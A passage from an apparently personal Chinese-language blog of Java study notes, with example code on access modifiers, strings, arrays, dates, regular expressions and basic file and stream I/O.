class="title">AccessControlStudy</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> String name = <span class="string">&quot;Pan3a&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>不同包中</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Pan3a.Class;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccessControlStudyThree</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> String name = <span class="string">&quot;Pan3a&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">SayName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello &quot;</span> + <span class="keyword">this</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>protected</code>属性访问用继承式。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Pan3a.DefaultStudy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.Pan3a.Class.AccessControlStudyThree;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProtectedStudy</span> <span class="keyword">extends</span> <span class="title">AccessControlStudyThree</span></span>&#123;</span><br><span class="line">    ProtectedStudy()&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello &quot;</span> + <span class="keyword">super</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccessControlStudyTwo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//      同一个包中的default可以使用</span></span><br><span class="line">        com.Pan3a.DefaultStudy.AccessControlStudy ac = <span class="keyword">new</span> com.Pan3a.DefaultStudy.AccessControlStudy();</span><br><span class="line">        System.out.println(ac.name);</span><br><span class="line"></span><br><span class="line"><span class="comment">//      不同包中</span></span><br><span class="line">        com.Pan3a.Class.AccessControlStudyThree three = <span class="keyword">new</span> AccessControlStudyThree();</span><br><span class="line"><span class="comment">//        System.out.println(three.name);</span></span><br><span class="line"><span class="comment">//      因为在不用包中因此调用时语法错误无法编译</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//      虽然是不同包中，但是这里可以通过继承的来访问</span></span><br><span class="line">        ProtectedStudy protectedStudy = <span class="keyword">new</span> ProtectedStudy();</span><br><span class="line"></span><br><span class="line"><span class="comment">//      因为访问的是AccessControlStudyThree中的SayName方法，变量是实例化的类中因此可访问</span></span><br><span class="line">        three.SayName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="public"><a href="#public" class="headerlink" title="public"></a>public</h3><ul><li>适用于任何情况，但实际项目仍需手动指定属性。</li></ul><h1 id="字符-amp-amp-字符串"><a href="#字符-amp-amp-字符串" class="headerlink" title="字符 &amp;&amp; 字符串"></a>字符 &amp;&amp; 字符串</h1><ul><li>字符用<code>&#39;P&#39;</code>这样的单引号进行包裹。</li><li>字符串用<code>&quot;Hello World&quot;</code>这样的双引号进行包裹。</li></ul><h2 id="字符数组"><a href="#字符数组" class="headerlink" title="字符数组"></a>字符数组</h2><ul><li>字符数组</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CharStudy</span></span>&#123;&#125;   </span><br><span class="line"><span class="function"><span class="keyword">public</span><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] HelloArray = &#123;<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;o&#x27;</span>&#125;;</span><br><span class="line">            String HelloString = <span class="keyword">new</span> String(HelloArray);</span><br><span class="line">            System.out.println(HelloString);</span><br><span class="line">            System.out.println(HelloString + <span class="string">&quot;字符长度为:&quot;</span> + HelloArray.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="创建字符串"><a href="#创建字符串" class="headerlink" title="创建字符串"></a>创建字符串</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StringStudy</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="comment">// 会创建一个匿名对象</span></span><br><span class="line">        String stringOne = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">        System.out.println(stringOne);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 构造函数创建字符串</span></span><br><span class="line">        String stringTwo = <span class="keyword">new</span> String(<span class="string">&quot;Pan3a&quot;</span>);</span><br><span class="line">        System.out.println(stringTwo);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 字符串拼接</span></span><br><span class="line">        String stringThree = <span class="string">&quot;Hello &quot;</span> + stringTwo;</span><br><span class="line">        System.out.println(stringThree);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 字符对比</span></span><br><span class="line">        String stringFour = stringOne.concat(stringTwo);</span><br><span class="line">        String stringFive = stringOne + stringTwo;</span><br><span class="line">        String stringSix = <span class="string">&quot;Hello Pan3a&quot;</span>;</span><br><span class="line">        <span class="comment">// 这里的 == 是比较内存中存放的首地址  equals 则是比较字符是否相同</span></span><br><span class="line">        <span class="keyword">if</span>(stringSix == stringFour)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">if</span>(stringSix.equals(stringFour))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;OK2&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><ul><li>格式化数字可以用<code>printf()</code>和<code>format()</code>方法。</li><li><code>format()</code>返回一个<code>String</code>对象而不是<code>PrintStream</code>，可以创建一个可复用的格式化字符串。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StringStudy</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">                <span class="keyword">int</span> intVar = <span class="number">1</span>;</span><br><span class="line">        String stringVar = <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">        System.out.printf(<span class="string">&quot;整型变量:&quot;</span> + <span class="string">&quot;%d&quot;</span> + <span class="string">&quot; 字符串变量:%s&quot;</span> + <span class="string">&quot;\n&quot;</span>,intVar,stringVar);</span><br><span class="line"></span><br><span class="line">        String fs;</span><br><span class="line">        fs = String.format(<span class="string">&quot;整型变量:&quot;</span> + <span class="string">&quot;%d&quot;</span> + <span class="string">&quot; 字符串变量:%s&quot;</span>,intVar,stringVar);</span><br><span class="line">        System.out.println(fs);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="StringBuffer-amp-amp-StringBuilder"><a href="#StringBuffer-amp-amp-StringBuilder" class="headerlink" title="StringBuffer &amp;&amp; StringBuilder"></a>StringBuffer &amp;&amp; StringBuilder</h2><ul><li>这里的<code>StringBuffer</code>和<code>StringBuilder</code>来由是因为平常创建的字符串在修改的时候是重新创建的一个对象，而不是原字符串。后者没有线程安全，但是相比前者后者有速度优势，因此大多数情况下建议使用后者。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StringStudy</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder(<span class="number">10</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">        System.out.println(sb);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num=<span class="number">0</span>;num&lt;sb.length();num++)&#123;</span><br><span class="line">            System.out.println(sb.charAt(num));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 这里实例化类会将字符进行一次输出</span></span><br><span class="line">        StringBuffer sBuffer = <span class="keyword">new</span> StringBuffer(<span class="string">&quot;Hello Pan3a&quot;</span>);</span><br><span class="line">        sBuffer.append(<span class="string">&quot;你好，&quot;</span>);</span><br><span class="line">        sBuffer.append(<span class="string">&quot;Pan3a&quot;</span>);</span><br><span class="line">        System.out.println(sBuffer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><ul><li>数组的遍历</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayStudy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//        数组大小</span></span><br><span class="line">        <span class="keyword">int</span> size = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">int</span>[] myList = <span class="keyword">new</span> <span class="keyword">int</span>[size];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num=<span class="number">0</span>;num&lt;size;num++)&#123;</span><br><span class="line">            myList[num] = size-(num+<span class="number">1</span>);</span><br><span class="line">            System.out.println(Integer.toString(num) + <span class="string">&quot; &quot;</span> + myList[num]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        加强型循环</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> value:myList)&#123;</span><br><span class="line">            System.out.println(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="日期时间"><a href="#日期时间" class="headerlink" title="日期时间"></a>日期时间</h1><ul><li>有时候需要查看当前时间并且格式化输出。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DateStudy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Date date = <span class="keyword">new</span> Date();</span><br><span class="line">        SimpleDateFormat ft = <span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd hh:mm:ss&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(date.getTime());</span><br><span class="line">        System.out.println(date.toString());</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;当前时间:&quot;</span> + ft.format(date));</span><br><span class="line">        System.out.printf(<span class="string">&quot;年-月-日:%tF%n&quot;</span>,date);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><ul><li>正则处理文本。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReStudy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String info = <span class="string">&quot;My name is Pan3a,I am from China&quot;</span>;</span><br><span class="line">        String pattern = <span class="string">&quot;.*Pan3a.*&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> isMatch = Pattern.matches(pattern,info);</span><br><span class="line">        System.out.println(<span class="string">&quot;字符是否包含 &#x27;Pan3a&#x27; ？&quot;</span> + isMatch);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="I-x2F-O"><a href="#I-x2F-O" class="headerlink" title="I&#x2F;O"></a>I&#x2F;O</h1><ul><li>平常接触多的应该就算文件的操作了。</li></ul><h2 id="File"><a href="#File" class="headerlink" title="File"></a>File</h2><ul><li>创建文件有个临时文件，删除文件</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileStudy</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        String filePath = <span class="string">&quot;C:\CodeProject\JavaStudy\src\Flag&quot;</span>;</span><br><span class="line">        File file = <span class="keyword">new</span> File(filePath);</span><br><span class="line">        System.out.println(file);</span><br><span class="line"><span class="comment">//      返回构造方法传入的路径</span></span><br><span class="line"><span class="comment">//        System.out.println(file.getPath());</span></span><br><span class="line"><span class="comment">//      返回绝对路径</span></span><br><span class="line"><span class="comment">//        System.out.println(file.getAbsolutePath());</span></span><br><span class="line"><span class="comment">//      类似于绝对路径，但是更规范</span></span><br><span class="line"><span class="comment">//        System.out.println(file.getCanonicalPath());</span></span><br><span class="line">        <span class="keyword">if</span>(file.isFile())&#123;</span><br><span class="line">            System.out.println(file.getAbsoluteFile() + <span class="string">&quot; 这是一个文件&quot;</span>);</span><br><span class="line"><span class="comment">//          判断文件是否可读</span></span><br><span class="line">            <span class="keyword">if</span>(file.canRead())&#123;</span><br><span class="line">                System.out.println(file.getAbsoluteFile() + <span class="string">&quot; 文件可读&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(file.getAbsoluteFile() + <span class="string">&quot; 文件不可读&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//          判断文件是否可写</span></span><br><span class="line">            <span class="keyword">if</span> (file.canWrite())&#123;</span><br><span class="line">                System.out.println(file.getAbsoluteFile() + <span class="string">&quot; 文件可写&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//          判断文件可执行</span></span><br><span class="line">            <span class="keyword">if</span>(file.canExecute())&#123;</span><br><span class="line">                System.out.println(file.getAbsoluteFile() + <span class="string">&quot; 文件可执行&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      File tempFile = File.createTempFile(<span class="string">&quot;tmp&quot;</span>,<span class="string">&quot;.txt&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>(tempFile.isFile())&#123;</span><br><span class="line">      System.out.println(tempFile.getAbsoluteFile() + <span class="string">&quot; 临时文件创建成功&quot;</span>);</span><br><span class="line"> tempFile.deleteOnExit();</span><br><span class="line">      System.out.println(tempFile.getAbsolutePath());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul><li>和文件类似，多的是目录中的文件和目录遍历，目录删除时无法删除非空目录。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileStudy</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        <span class="comment">//      创建目录</span></span><br><span class="line">       File createDir = <span class="keyword">new</span> File(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">       <span class="comment">// File createDirs = new File(&quot;Hello/Hello/Hello&quot;); </span></span><br><span class="line">       <span class="comment">// if(createDirs.mkdirs())   这里mkdirs 可以创建没有的父目录</span></span><br><span class="line">       <span class="keyword">if</span>(createDir.mkdir())&#123;</span><br><span class="line">           System.out.println(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">           <span class="keyword">if</span>(createDir.delete())&#123;</span><br><span class="line">               <span class="comment">// 这里的删除只能删除非空的目录</span></span><br><span class="line">               System.out.println(createDir.getAbsolutePath() + <span class="string">&quot; 文件删除成功&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       String dirPath = <span class="string">&quot;C:\\windows&quot;</span>;</span><br><span class="line">       File dir = <span class="keyword">new</span> File(dirPath);</span><br><span class="line">       File[] dirs = dir.listFiles(<span class="keyword">new</span> FilenameFilter() &#123;</span><br><span class="line">            <span class="comment">// 重载方法，过滤不需要的文件</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">accept</span><span class="params">(File dir, String name)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> name.endsWith(<span class="string">&quot;.exe&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">       &#125;</span><br><span class="line">     );</span><br><span class="line"><span class="comment">//        for (int i=0;i&lt;dirs.length;i++)&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(dirs[i]);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="keyword">for</span> (File f:dirs)&#123;</span><br><span class="line">            System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="InputStream"><a href="#InputStream" class="headerlink" title="InputStream"></a>InputStream</h2><ul><li>所有与IO操作相关的代码都必须正确处理<code>IOException</code>，否则无法正常运行。</li><li>读取文本是字节或字符串。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InputStreamStudy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">readFile</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>(InputStream inputStream = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;c://CodeProject//JavaStudy//src//Flag&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">int</span> n;</span><br><span class="line">            <span class="keyword">while</span> ((n = inputStream.read()) != -<span class="number">1</span>)&#123;</span><br><span class="line">                System.out.println((<span class="keyword">char</span>) n);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">readFileBuffer</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>(InputStream inputStream = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;c://CodeProject//JavaStudy//src//Flag&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1000</span>];</span><br><span class="line">            <span class="keyword">int</span> n;</span><br><span class="line">            <span class="keyword">while</span> ((n = inputStream.read(buffer)) != -<span class="number">1</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;read &quot;</span> + n + <span class="string">&quot; bytes&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readFileAsString</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">while</span> ((n = inputStream.read()) != -<span class="number">1</span>)&#123;</span><br><span class="line">            stringBuilder.append((<span class="keyword">char</span>) n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stringBuilder.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        InputStream inputStream = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;c://CodeProject//JavaStudy//src//Flag&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (;;)&#123;</span><br><span class="line">            <span class="keyword">int</span> n = inputStream.read();  <span class="comment">// 反复读取</span></span><br><span class="line">            <span class="keyword">if</span>(n == -<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(n); <span class="comment">// 打印的byte的值</span></span><br><span class="line">        &#125;</span><br><span class="line">        inputStream.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">//        如果代码出错，并不会回收输入流，可用try</span></span><br><span class="line">        readFile();</span><br><span class="line"></span><br><span class="line"><span class="comment">//        一次读取一个字节不高效，因此可以使用缓冲</span></span><br><span class="line">        readFileBuffer();</span><br><span class="line"></span><br><span class="line"><span class="comment">//        读取文本字符</span></span><br><span class="line">        String string;</span><br><span class="line">        <span class="keyword">try</span>(InputStream input = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;c://CodeProject//JavaStudy//src//Flag&quot;</span>))&#123;</span><br><span class="line">            string = readFileAsString(input);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(string);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="OutputStream"><a href="#OutputStream" class="headerlink" title="OutputStream"></a>OutputStream</h2><ul><li>文件写入，没看到追加</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 